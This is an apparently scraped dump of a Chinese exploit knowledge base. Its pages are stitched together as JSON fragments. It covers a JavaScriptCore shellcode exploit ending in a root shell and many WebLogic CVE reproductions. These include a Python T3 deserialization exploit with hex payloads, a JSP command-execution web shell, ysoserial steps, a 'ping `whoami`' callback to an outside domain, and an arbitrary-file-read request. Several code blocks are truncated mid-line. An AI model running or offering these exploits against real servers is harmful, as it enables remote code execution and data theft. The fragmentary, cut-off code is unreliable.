function addrof(obj){ boxed[0] = obj; return f2i(unboxed[14]); } function fakeobj(addr){ unboxed[14] = i2f(addr); return boxed[0]; } 任意地址读写 & 写 wasm getshell 接下来的利用基本上就都是通用套路了，改 ArrayWithDouble 的 butterfly 任意地址读写，然后找 wasm 的rwx 段写shellcode, 执行shellcode 完事。 exp 完整exp 如下 var conversion_buffer = new ArrayBuffer(8) var f64 = new Float64Array(conversion_buffer) var i32 = new Uint32Array(conversion_buffer) var BASE32 = 0x100000000 function f2i(f) { f64[0] = f return i32[0] + BASE32 * i32[1] } function i2f(i) { i32[0] = i % BASE32 i32[1] = i / BASE32 return f64[0] } function user_gc() { for (let i = 0; i 运行效果 运行效果如下 ╰$ ./jsc exp.js hit: 2e5e Object: 0x7fffae2af690 with butterfly 0x7fe00028c078 (Structure 0x7fffaf6f2a70:[Array, {}, ArrayWithDouble, Proto:0x7fffaf6c80a0, Leaf]), StructureID: 98 Object: 0x7fffae2af6a0 with butterfly 0x7fe00028c0e8 (Structure 0x7fffaf6f2ae0:[Array, {}, ArrayWithContiguous, Proto:0x7fffaf6c80a0]), StructureID: 99 Object: 0x7fffae2591f0 with butterfly 0x7fe000280058 (Structure 0x7fffaf670d20:[Array, {prop:100, prop1:101}, ArrayWithDouble, Proto:0x7fffaf6c80a0, Leaf]), StructureID: 317 7fffae2591f0 Object: 0x7fffaf6c8380 with butterfly (nil) (Structure 0x7fffaf670e00:[Object, {jscell:0, butterfly:1}, NonArray, Proto:0x7fffaf6b4000, Leaf]), StructureID: 319 7fffae208000 7ffff000a500 7fffb0001000 # id uid=0(root) gid=0(root) groups=0(root) # ##参考链接 https://xz.aliyun.com/t/7694\\#toc-2 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:49 "},"Web安全/Weblogic/（CVE-2017-10271）Weblogic XMLDecoder 反序列化漏洞/（CVE-2017-10271）Weblogic XMLDecoder 反序列化漏洞.html":{"url":"Web安全/Weblogic/（CVE-2017-10271）Weblogic XMLDecoder 反序列化漏洞/（CVE-2017-10271）Weblogic XMLDecoder 反序列化漏洞.html","title":"（CVE-2017-10271）Weblogic XMLDecoder 反序列化漏洞","keywords":"","body":"(CVE-2017-10271)Java反序列化漏洞 一、漏洞简介 二、漏洞影响 Oracle WebLogic Server10.3.6.0.0 Oracle WebLogic Server12.1.3.0.0 Oracle WebLogic Server12.2.1.1.0 Oracle WebLogic Server12.2.1.3.0 三、复现过程 exp https://github.com/ianxtianxt/-CVE-2017-10271- poc xml 文件 /Applications/Calculator.app/Contents/MacOS/Calculator 读取xml文件，进行反序列化执行命令代码： import java.io.BufferedInputStream; import java.io.FileInputStream; import java.io.FileNotFoundException; public class xmlrce { public static void main(String[] args) { // TODO Auto-generated method stub java.io.File file = new java.io.File(\"/Users/pirogue/IdeaProjects/weblogic/src/poc.xml\"); java.beans.XMLDecoder xd = null; try { xd = new java.beans.XMLDecoder(new BufferedInputStream(new FileInputStream(file))); } catch (FileNotFoundException e) { // TODO Auto-generated catch block e.printStackTrace(); } Object s2 = xd.readObject(); xd.close(); } } WeblogicXMLDecoder反序列化漏洞/media/rId27.png) CVE-2017-10271 weblogic反序列化漏洞 WLSServletAdapter.class public void handle(ServletContext var1, HttpServletRequest var2, HttpServletResponse var3) throws IOException { if (var2.getMethod().equals(\"GET\") || var2.getMethod().equals(\"HEAD\")) { HttpMetadataPublisher var4 = (HttpMetadataPublisher)this.endpoint.getSPI(HttpMetadataPublisher.class); if (var4 != null && var4.handleMetadataRequest(this, this.createConnection(var1, var2, var3))) { return; } if (this.isOraWsdlMetadataQuery(var2.getQueryString())) { this.publishWSDL(this.createConnection(var1, var2, var3)); return; } } super.handle(var1, var2, var3); } WeblogicXMLDecoder反序列化漏洞/media/rId28.png) 当开启调试模式，ping时，WLSServletAdapter对请求进行接收处理，执行到super.handle(var1, var2, var3);后，跟进关键代码如下： WeblogicXMLDecoder反序列化漏洞/media/rId29.png) WorkContentServerTube.class WeblogicXMLDecoder反序列化漏洞/media/rId30.png) public NextAction processRequest(Packet var1) { this.isUseOldFormat = false; if (var1.getMessage() != null) { HeaderList var2 = var1.getMessage().getHeaders(); Header var3 = var2.get(WorkAreaConstants.WORK_AREA_HEADER, true); if (var3 != null) { this.readHeaderOld(var3); this.isUseOldFormat = true; } Header var4 = var2.get(this.JAX_WS_WORK_AREA_HEADER, true); if (var4 != null) { this.readHeader(var4); } } return super.processRequest(var1); } 将var3传递给readHeaderOld(var3)，继续跟进readHeaderOld。 var1的值: [email protected]/* */ Content: /bin/bash -c ping `whoami`.7153b738c41fxxxxxxaadf9dbd46.tu4.org WeblogicXMLDecoder反序列化漏洞/media/rId31.png) WorkContextTube.class protected void readHeaderOld(Header var1) { try { XMLStreamReader var2 = var1.readHeader(); var2.nextTag(); var2.nextTag(); XMLStreamReaderToXMLStreamWriter var3 = new XMLStreamReaderToXMLStreamWriter(); ByteArrayOutputStream var4 = new ByteArrayOutputStream(); XMLStreamWriter var5 = XMLStreamWriterFactory.create(var4); var3.bridge(var2, var5); var5.close(); WorkContextXmlInputAdapter var6 = new WorkContextXmlInputAdapter(new ByteArrayInputStream(var4.toByteArray())); this.receive(var6); } catch (XMLStreamException var7) { throw new WebServiceException(var7); } catch (IOException var8) { throw new WebServiceException(var8); } } WeblogicXMLDecoder反序列化漏洞/media/rId32.png) 基础知识拓展： ByteArrayInputStream的用法： InputStream |__ ByteArrayInputStream OutputStream |__ ByteArrayOutputStream ByteArrayInputStream可以将字节数组转化为输入流。ByteArrayOutputStream可以捕获内存缓冲区的数据，转化成字节数组。 构造函数： public ByteArrayInputStream(byte buf[]) public ByteArrayInputStream(byte buf[], int offset, int length) 注意它需要提供一个byte数组作为缓冲区。 我们通过idea代码窗口内可以看到各个变量在调试运行后的值，var4的值就是接收poc的xml，在 WorkContextXmlInputAdapter var6 = new WorkContextXmlInputAdapter(new ByteArrayInputStream(var4.toByteArray())); 中，要创建WorkContextXmlInputAdapter的实例var6, 则var4.toByteArray()先转换成字节数组，传入ByteArrayInputStream转换成输入流，跟进WorkContextXmlInputAdapter，在WorkContextXmlInputAdapter.class内，WorkContextXmlInputAdapter接收输入流，并将输入流转换成XMLDecoder对象，这时如果再调用XMLDecoder的readObject()方法对其进行反序列化即可造成命令执行。其实在this.receive(var6);中，进行了多层调用最终到达readObject，下面会省略过多无关调试，记录xml反序列化相关： 下面是对WorkContextXmlInputAdapter和创建xml反序列化对象后如何执行的readObject方法造成rce的代码跟踪 WorkContextXmlInputAdapter.class // // Source code recreated from a .class file by IntelliJ IDEA // (powered by Fernflower decompiler) // package weblogic.wsee.workarea; import java.beans.XMLDecoder; import java.io.FileInputStream; import java.io.IOException; import java.io.InputStream; import java.io.NotSerializableException; import weblogic.workarea.WorkContext; import weblogic.workarea.WorkContextInput; public final class WorkContextXmlInputAdapter implements WorkContextInput { private final XMLDecoder xmlDecoder; public WorkContextXmlInputAdapter(InputStream var1) { this.xmlDecoder = new XMLDecoder(var1); // WorkContextXmlInputAdapter构造函数，将输入流转换成XMLDecoder反序列化对象 } public WorkContextXmlInputAdapter(XMLDecoder var1) { this.xmlDecoder = var1; } public String readASCII() throws IOException { return (String)this.xmlDecoder.readObject(); } public WorkContext readContext() throws IOException, ClassNotFoundException { Class var1 = Class.forName(this.readASCII()); try { WorkContext var2 = (WorkContext)var1.newInstance(); var2.readContext(this); return var2; } catch (InstantiationException var3) { throw (IOException)(new NotSerializableException(\"WorkContext must have a public no-arg constructor\")).initCause(var3); } catch (IllegalAccessException var4) { throw (IOException)(new NotSerializableException(\"WorkContext must have a public no-arg constructor\")).initCause(var4); } } public void readFully(byte[] var1) throws IOException { byte[] var2 = (byte[])((byte[])this.xmlDecoder.readObject()); System.arraycopy(var2, 0, var1, 0, var2.length); } public void readFully(byte[] var1, int var2, int var3) throws IOException { byte[] var4 = (byte[])((byte[])this.xmlDecoder.readObject()); System.arraycopy(var4, 0, var1, var2, var3); } public int skipBytes(int var1) throws IOException { throw new UnsupportedOperationException(); } public boolean readBoolean() throws IOException { return (Boolean)this.xmlDecoder.readObject(); } public byte readByte() throws IOException { return (Byte)this.xmlDecoder.readObject(); } public int readUnsignedByte() throws IOException { return (Integer)this.xmlDecoder.readObject(); } public short readShort() throws IOException { return (Short)this.xmlDecoder.readObject(); } public int readUnsignedShort() throws IOException { return (Integer)this.xmlDecoder.readObject(); } public char readChar() throws IOException { return (Character)this.xmlDecoder.readObject(); } public int readInt() throws IOException { return (Integer)this.xmlDecoder.readObject(); } public long readLong() throws IOException { return (Long)this.xmlDecoder.readObject(); } public float readFloat() throws IOException { return (Float)this.xmlDecoder.readObject(); } public double readDouble() throws IOException { return (Double)this.xmlDecoder.readObject(); } public String readLine() throws IOException { return (String)this.xmlDecoder.readObject(); } public String readUTF() throws IOException { return (String)this.xmlDecoder.readObject(); } public static void main(String[] var0) throws Exception { XMLDecoder var1 = new XMLDecoder(new FileInputStream(var0[0])); WorkContextXmlInputAdapter var2 = new WorkContextXmlInputAdapter(var1); System.out.println(var2.readASCII()); System.out.println(var2.readInt()); byte[] var3 = new byte[20]; var2.readFully(var3); System.out.println(var3); System.out.println(var2.readBoolean()); System.out.println(var2.readByte()); System.out.println(var2.readShort()); System.out.println(var2.readChar()); System.out.println(var2.readInt()); System.out.println(var2.readLong()); System.out.println(var2.readFloat()); System.out.println(var2.readDouble()); System.out.println(var2.readUTF()); System.out.println(var2.readUTF()); System.out.println(var2.readUTF()); } } WorkContextXmlInputAdapter->new XMLDecoder(var1) WorkContextEntrylmpl.class public static WorkContextEntry readEntry(WorkContextInput var0) throws IOException, ClassNotFoundException { String var1 = var0.readUTF(); return (WorkContextEntry)(var1.length() == 0 ? NULL_CONTEXT : new WorkContextEntryImpl(var1, var0)); } 第72行，readUTF() WorkContextXmlInputAdapter.class 第103行 public String readUTF() throws IOException { return (String)this.xmlDecoder.readObject(); } WeblogicXMLDecoder反序列化漏洞/media/rId33.png) 当WorkContextEntrylmpl.class中的readUTF执行完成之后，返回反序列化的字符串，rce也执行完成！8 WeblogicXMLDecoder反序列化漏洞/media/rId34.png) weglogic log: /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/log Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:55 "},"Web安全/Weblogic/（CVE-2017-3248）Weblogic 反序列化漏洞/（CVE-2017-3248）Weblogic 反序列化漏洞.html":{"url":"Web安全/Weblogic/（CVE-2017-3248）Weblogic 反序列化漏洞/（CVE-2017-3248）Weblogic 反序列化漏洞.html","title":"（CVE-2017-3248）Weblogic 反序列化漏洞","keywords":"","body":"CVE-2017-3248 一、漏洞简介 二、漏洞影响 WebLogic 10.3.6.0WebLogic 12.1.3.0WebLogic 12.2.1.0WebLogic 12.2.1.1 三、复现过程 http://www.0-sec.org/download/CVE-2017-32 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:53 "},"Web安全/Weblogic/（CVE-2017-3506）Weblogic反序列化漏洞/（CVE-2017-3506）Weblogic反序列化漏洞.html":{"url":"Web安全/Weblogic/（CVE-2017-3506）Weblogic反序列化漏洞/（CVE-2017-3506）Weblogic反序列化漏洞.html","title":"（CVE-2017-3506）Weblogic反序列化漏洞","keywords":"","body":"（CVE-2017-3506） 一、漏洞简介 二、漏洞影响 Oracle WebLogic Server10.3.6.0.0 Oracle WebLogic Server12.1.3.0.0 Oracle WebLogic Server12.2.1.1.0 Oracle WebLogic Server12.2.1.2.0 三、复现过程 https://github.com/ianxtianxt/CVE-2017-3506 Weblogic反序列化漏洞/media/rId25.png) [*] 漏洞编号 CVE-2017-3506 & CVE-2017-10271 [*] 漏洞详情 https://www.secfree.com/article-635.html [*] 作者邮箱 Bearcat@secfree.com [*] 使用方法: [*] 单个检测 -u http://Host:Port [*] 批量检测 -f url.txt [*] 上传木马 -s http://Host:Port /wls-wsat/CoordinatorPortType11 shell.jsp [*] wls-wsat组件路径： /wls-wsat/CoordinatorPortType /wls-wsat/CoordinatorPortType11 /wls-wsat/ParticipantPortType /wls-wsat/ParticipantPortType11 /wls-wsat/RegistrationPortTypeRPC /wls-wsat/RegistrationPortTypeRPC11 /wls-wsat/RegistrationRequesterPortType /wls-wsat/RegistrationRequesterPortType1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:53 "},"Web安全/Weblogic/（CVE-2018-2628）Weblogic反序列化漏洞/（CVE-2018-2628）Weblogic反序列化漏洞.html":{"url":"Web安全/Weblogic/（CVE-2018-2628）Weblogic反序列化漏洞/（CVE-2018-2628）Weblogic反序列化漏洞.html","title":"（CVE-2018-2628）Weblogic反序列化漏洞","keywords":"","body":"（CVE-2018-2628） 一、漏洞简介 二、漏洞影响 Oracle WebLogic Server10.3.6.0.0 Oracle WebLogic Server12.1.3.0.0 Oracle WebLogic Server12.2.1.2.0 Oracle WebLogic Server12.2.1.3.0 三、复现过程 Usage: cve-2018-2628 127.0.0.1 7001 #!env python #coding=utf-8 import sys import socket import time import re VUL=['CVE-2018-2628'] PAYLOAD=['aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078'] VER_SIG=['\\\\$Proxy[0-9]+'] def t3handshake(sock,server_addr): sock.connect(server_addr) sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex')) time.sleep(1) sock.recv(1024) print 'handshake successful' def buildT3RequestObject(sock,port): data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371' data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(dport)) data3 = '1a7727000d3234322e323134' data4 = '2e312e32353461863d1d0000000078' for d in [data1,data2,data3,data4]: sock.send(d.decode('hex')) time.sleep(2) print 'send request payload successful,recv length:%d'%(len(sock.recv(2048))) def sendEvilObjData(sock,data): payload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000' payload+=data payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff' payload = '%s%s'%('{:08x}'.format(len(payload)/2 + 4),payload) sock.send(payload.decode('hex')) time.sleep(2) sock.send(payload.decode('hex')) res = '' try: while True: res += sock.recv(4096) time.sleep(0.1) except Exception as e: pass return res def checkVul(res,server_addr,index): p=re.findall(VER_SIG[index], res, re.S) if len(p)>0: print '%s:%d is vul %s'%(server_addr[0],server_addr[1],VUL[index]) else: print '%s:%d is not vul %s' % (server_addr[0],server_addr[1],VUL[index]) def run(dip,dport,index): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整 sock.settimeout(65) server_addr = (dip, dport) t3handshake(sock,server_addr) buildT3RequestObject(sock,dport) rs=sendEvilObjData(sock,PAYLOAD[index]) print 'rs',rs checkVul(rs,server_addr,index) if __name__==\"__main__\": if len(sys.argv) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:58 "},"Web安全/Weblogic/（CVE-2018-2893）Weblogic WLS核心组件反序列化漏洞/（CVE-2018-2893）Weblogic WLS核心组件反序列化漏洞.html":{"url":"Web安全/Weblogic/（CVE-2018-2893）Weblogic WLS核心组件反序列化漏洞/（CVE-2018-2893）Weblogic WLS核心组件反序列化漏洞.html","title":"（CVE-2018-2893）Weblogic WLS核心组件反序列化漏洞","keywords":"","body":"CVE-2018-2893 一、漏洞简介 二、漏洞影响 三、复现过程 https://github.com/ianxtianxt/CVE-2018-2893 Step 1 java -jar ysoserial-cve-2018-2893.jar WHY SO SERIAL? Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]' Available payload types: Payload Authors Dependencies ------- ------- ------------ JRMPClient @mbechler JRMPClient2 JRMPClient3 JRMPClient4 Jdk7u21 @frohoff Step 2 java -jar ysoserial-cve-2018-2893.jar JRMPClient4 \":\" > poc4.ser Step 3 python weblogic.py \\ \\ poc4. Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:58 "},"Web安全/Weblogic/（CVE-2018-2894）Weblogic任意文件上传/（CVE-2018-2894）Weblogic任意文件上传.html":{"url":"Web安全/Weblogic/（CVE-2018-2894）Weblogic任意文件上传/（CVE-2018-2894）Weblogic任意文件上传.html","title":"（CVE-2018-2894）Weblogic任意文件上传","keywords":"","body":"（CVE-2018-2894）WebLogic任意文件上传 一、漏洞简介 二、漏洞影响 漏洞影响版本：10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3 三、复现过程 下载地址：http://download.oracle.com/otn/nt/middleware/12c/12213/fmw_12.2.1.3.0_wls_quick_Disk1_1of1.zip 漏洞复现 服务启动后，访问 http://localhost:7001/ws_utc/config.do Weblogic任意文件上传/media/rId26.png) 可以将当前的工作目录为更改为其他目录。以本地环境为例，可以部署到 C:\\Oracle\\Middleware\\Oracle_Home\\user_projects\\domains\\base_domain\\servers\\AdminServer\\tmp\\_WL_internal\\com.oracle.webservices.wls.ws-testclient-app-wls\\4mcj4y\\war 选择右边的安全栏目，添加JKS Keystores上传文件。假设chybeta.jsp内容如下： \"); Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParameter(\"cmd\")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %> 抓包获取到时间戳为1531987145013，则上传到的位置即config\\keystore\\1531987145013_chybeta.jsp Weblogic任意文件上传/media/rId27.png) 访问http://localhost:7001/ws_utc/config/keystore/1531987145013_chybeta.jsp Weblogic任意文件上传/media/rId29.png) 简要漏洞分析 在ws-testpage-impl.jar!/com/oracle/webservices/testclient/setting/TestClientWorkDirManager.class:59: public void changeWorkDir(String path) { String[] oldPaths = this.getRelatedPaths(); if (this.testPageProvider.getWsImplType() == ImplType.JRF) { this.isWorkDirChangeable = false; this.isWorkDirWritable = isDirWritable(path); this.isWorkDirChangeable = true; this.setTestClientWorkDir(path); } else { this.persistWorkDir(path); this.init(); } if (this.isWorkDirWritable) { String[] newPaths = this.getRelatedPaths(); moveDirs(oldPaths, newPaths); } else { Logger.fine(\"[INFO] Newly specified TestClient Working Dir is readonly. Won't move the configuration stuff to new path.\"); } } 此函数用于改变工作目录，但其中并未做任何检测。 在ws-testpage-impl.jar!/com/oracle/webservices/testclient/ws/res/SettingResource.class:181中： @Path(\"/keystore\") @POST @Produces({\"application/xml\", \"application/json\"}) @Consumes({\"multipart/form-data\"}) public Response editKeyStoreSettingByMultiPart(FormDataMultiPart formPartParams) { if (!RequestUtil.isRequstedByAdmin(this.request)) { return Response.status(Status.FORBIDDEN).build(); } else { if (TestClientRT.isVerbose()) { Logger.fine(\"calling SettingResource.addKeyStoreSettingByMultiPart\"); } String currentTimeValue = \"\" + (new Date()).getTime(); KeyValuesMap formParams = RSDataHelper.getInstance().convertFormDataMultiPart(formPartParams, true, TestClientRT.getKeyStorePath(), currentTimeValue); .... } } 跟入ws-testpage-impl.jar!/com/oracle/webservices/testclient/core/ws/cdf/config/parameter/TestClientRT.class:31 public static String getKeyStorePath() { return getConfigDir() + File.separator + \"keystore\"; } 得到要写入的路径storePath。 在ws-testpage-impl.jar!/com/oracle/webservices/testclient/ws/util/RSDataHelper.class:145: public KeyValuesMap convertFormDataMultiPart(FormDataMultiPart formPartParams, boolean isExtactAttachment, String path, String fileNamePrefix) { ... if (attachName != null && attachName.trim().length() > 0) { if (attachName != null && attachName.trim().length() != 0) { attachName = this.refactorAttachName(attachName); if (fileNamePrefix == null) { fileNamePrefix = key; } String filename = (new File(storePath, fileNamePrefix + \"_\" + attachName)).getAbsolutePath(); kvMap.addValue(key, filename); if (isExtactAttachment) { this.saveAttachedFile(filename, (InputStream)bodyPart.getValueAs(InputStream.class)); } } } ... } 把上传文件的内容传到了storePath目录里，文件名满足fileNamePrefix + \\\"_\\\" attachName。这过程没有任何过滤和检查：）... 利用条件： 需要知道部署应用的web目录 ws_utc/config.do在开发模式下无需认证，在生产模式下需要认证。具体可见Oracle® Fusion Middleware Administering We Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:59 "},"Web安全/Weblogic/（CVE-2018-3191）Weblogic远程代码执行漏洞/（CVE-2018-3191）Weblogic远程代码执行漏洞.html":{"url":"Web安全/Weblogic/（CVE-2018-3191）Weblogic远程代码执行漏洞/（CVE-2018-3191）Weblogic远程代码执行漏洞.html","title":"（CVE-2018-3191）Weblogic远程代码执行漏洞","keywords":"","body":"（CVE-2018-3191） 一、漏洞简介 二、漏洞影响 weblogic-spring-jndi-12.2.1.3.jar 对于weblogic： 12.2.1.3weblogic-spring-jndi-10.3.6.0.jar 对于weblogic： 10.3.6.012.2.1.012.1.3.012.2.1.1 三、复现过程 http://0-sec.org/download/CVE-2018-31 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:00 "},"Web安全/Weblogic/（CVE-2018-3245）Weblogic反序列化远程代码执行漏洞/（CVE-2018-3245）Weblogic反序列化远程代码执行漏洞.html":{"url":"Web安全/Weblogic/（CVE-2018-3245）Weblogic反序列化远程代码执行漏洞/（CVE-2018-3245）Weblogic反序列化远程代码执行漏洞.html","title":"（CVE-2018-3245）Weblogic反序列化远程代码执行漏洞","keywords":"","body":"（CVE-2018-3245） 一、漏洞简介 二、漏洞影响 三、复现过程 https://github.com/ianxtianxt/CVE-2018-3245 Step 1 java -jar ysoserial-cve-2018-3245.jar WHY SO SERIAL? Usage: java -jar ysoserial-cve-2018-3245.jar [payload] '[command]' Available payload types: Payload Authors Dependencies ------- ------- ------------ CVE_2018_2893_1 @mbechler CVE_2018_2893_2 @mbechler CVE_2018_2893_3 @mbechler CVE_2018_3245 @mbechler JRMPClient @mbechler Jdk7u21 @frohoff Step 2 java -jar ysoserial-cve-2018-3245.jar CVE_2018_3245 \"[RMI_SERVICE_IP]:[PORT]\" > poc5.ser Step 3 python weblogic.py [TARGET_HOST] [PORT] poc5. Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:00 "},"Web安全/Weblogic/（CVE-2019-2615）Weblogic 任意文件读取漏洞/（CVE-2019-2615）Weblogic 任意文件读取漏洞.html":{"url":"Web安全/Weblogic/（CVE-2019-2615）Weblogic 任意文件读取漏洞/（CVE-2019-2615）Weblogic 任意文件读取漏洞.html","title":"（CVE-2019-2615）Weblogic 任意文件读取漏洞","keywords":"","body":"（CVE-2019-2615）Weblogic 任意文件读取漏洞 一、漏洞简介 攻击者可以在已知用户名密码的情况下读取WebLogic服务器中的任意文件。 二、漏洞影响 Weblogic 10.3.6.0Weblogic 12.1.3.0Weblogic 12.2.1.2Weblogic 12.2.1.3 三、复现过程 漏洞分析 该功能的关键代码在 weblogic.management.servlet.FileDistributionServlet的doGet()方法中： public void doGet(final HttpServletRequest var1, final HttpServletResponse var2) throws ServletException, IOException { AuthenticatedSubject var3 = this.authenticateRequest(var1, var2); if(var3 != null) { final String var4 = var1.getHeader(\"wl_request_type\"); if(var3 != KERNEL_ID) { AdminResource var5 = new AdminResource(\"FileDownload\", (String)null, var4); if(!this.am.isAccessAllowed(var3, var5, (ContextHandler)null)) { ManagementLogger.logErrorFDSUnauthorizedDownloadAttempt(var3.getName(), var4); var2.sendError(401); return; } } try { if(debugLogger.isDebugEnabled()) { debugLogger.debug(\"---- >doGet incoming request: \" + var4); } if(var4.equals(\"wl_xml_entity_request\")) { this.doGetXMLEntityRequest(var1, var2); } else if(var4.equals(\"wl_jsp_refresh_request\")) { this.doGetJspRefreshRequest(var1, var2); } else if(var4.equals(\"file\")) { this.doGetFile(var1, var2); } else if(!var4.equals(\"wl_init_replica_request\") && !var4.equals(\"wl_file_realm_request\") && !var4.equals(\"wl_managed_server_independence_request\")) { var2.addHeader(\"ErrorMsg\", \"Bad request type\"); String var10 = Utils.encodeXSS(var4); var2.sendError(400, \"Bad request type: \" + var10); ManagementLogger.logBadRequestInFileDistributionServlet(var4); } else { ...... ...... } } } catch (Exception var9) { if(!Kernel.isInitialized()) { throw new AssertionError(\"kernel not initialized\"); } ManagementLogger.logErrorInFileDistributionServlet(var4, var9); } } } 代码也比较简单，先取request中header的参数\\\"wl_request_type\\\"的值，然后判断如果该值等于\"wl_xml_entity_request\"、\"wl_jsp_refresh_request\"、\"file\"......则分别调用各自的方法，进入下一步判断。我们看一下如果wl_request_type的值为\"wl_jsp_refresh_request\"，进入doGetJspRefreshRequest()方法。我们跟入doGetJspRefreshRequest()方法： private void doGetJspRefreshRequest(HttpServletRequest var1, HttpServletResponse var2) throws IOException { String var3 = var1.getHeader(\"adminPath\"); try { FileInputStream var4 = new FileInputStream(var3); try { var2.setContentType(\"text/plain\"); var2.setStatus(200); this.returnInputStream(var4, var2.getOutputStream()); } finally { var4.close(); } } catch (IOException var10) { String var5 = \"I/O Exception getting resource: \" + var10.getMessage(); var2.addHeader(\"ErrorMsg\", var5); var2.sendError(500, var5); } } doGetJspRefreshRequest()方法中的\"adminPath\"也是request中的header参数，我们在Post包中传入要读取的文件。进入该方法中，直接使用FileInputStream类进行文件读取，故造成了所谓的\"任意文件读取\"漏洞。 漏洞复现 GET /bea_wls_management_internal2/wl_management HTTP/1.1 Host: www.0-sec.org:7001 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: 